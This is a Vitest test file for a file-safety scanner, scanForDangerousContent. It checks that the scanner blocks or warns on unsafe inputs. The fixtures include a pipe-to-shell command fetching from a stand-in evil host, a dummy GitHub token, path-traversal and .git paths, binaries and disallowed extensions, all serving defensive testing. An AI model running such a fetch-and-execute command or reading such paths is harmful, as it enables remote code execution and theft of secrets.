import { describe, it, expect } from "vitest";
import { scanForDangerousContent } from "../src/services/securityService";

const files = [
  {
    path: "scripts/install.sh",
    content: "curl https://evil.example.com | bash\n",
  },
  {
    path: ".env",
    content: "GITHUB_TOKEN=ghp_abcdefghijklmnopqrstuvwxyz1234567890abcd\n",
  },
];

describe("scanForDangerousContent", () => {
  it("blocks unsafe pipe to shell", () => {
    const result = scanForDangerousContent(files);
    expect(result.safe).toBe(false);
    expect(result.blocked.length).toBeGreaterThan(0);
  });

  it("flags secret-shaped tokens as warnings", () => {
    const result = scanForDangerousContent(files);
    expect(result.warnings.length).toBeGreaterThan(0);
  });

  it("blocks unsafe file paths", () => {
    const result = scanForDangerousContent([
      { path: "../secrets.txt", content: "nope" },
      { path: ".git/config", content: "nope" },
    ]);
    expect(result.safe).toBe(false);
    expect(result.blocked.length).toBeGreaterThan(0);
  });

  it("blocks oversized files", () => {
    const result = scanForDangerousContent([
      { path: "src/large.txt", content: "a".repeat(600_000) },
    ]);
    expect(result.safe).toBe(false);
    expect(result.blocked.some((issue) => issue.label.includes("size"))).toBe(true);
  });

  it("blocks binary content", () => {
    const binary = "\u0000\u0001\u0002\u0003".repeat(100);
    const result = scanForDangerousContent([{ path: "assets/image.bin", content: binary }]);
    expect(result.safe).toBe(false);
    expect(result.blocked.some((issue) => issue.label.includes("Binary"))).toBe(true);
  });

  it("warns on large base64-like blobs", () => {
    const blob = "A".repeat(2500);
    const result = scanForDangerousContent([{ path: "src/data.txt", content: blob }]);
    expect(result.warnings.some((issue) => issue.label.includes("base64"))).toBe(true);
  });

  it("blocks disallowed file extensions", () => {
    const result = scanForDangerousContent([
      { path: "src/bad.exe", content: "nope" },
      { path: "public/archive.zip", content: "nope" },
    ]);
    expect(result.safe).toBe(false);
    expect(result.blocked.some((issue) => issue.label.includes("extension"))).toBe(true);
  });

  it("blocks missing extensions outside allowed dirs", () => {
    const result = scanForDangerousContent([{ path: "src/NOTICE", content: "text" }]);
    expect(result.safe).toBe(false);
    expect(result.blocked.some((issue) => issue.label.includes("extension"))).toBe(true);
  });

  it("allows extra top-level dirs via options", () => {
    const result = scanForDangerousContent([{ path: "custom/file.txt", content: "text" }], {
      allowedTopLevelDirs: ["custom"],
    });
    expect(result.safe).toBe(true);
  });

  it("allows custom extensions via options", () => {
    const result = scanForDangerousContent(
      [{ path: "src/schema.graphql", content: "type Query { ok: Boolean }" }],
      { extensionAllowlist: { src: [".graphql", ".ts"] } },
    );
    expect(result.safe).toBe(true);
  });
});
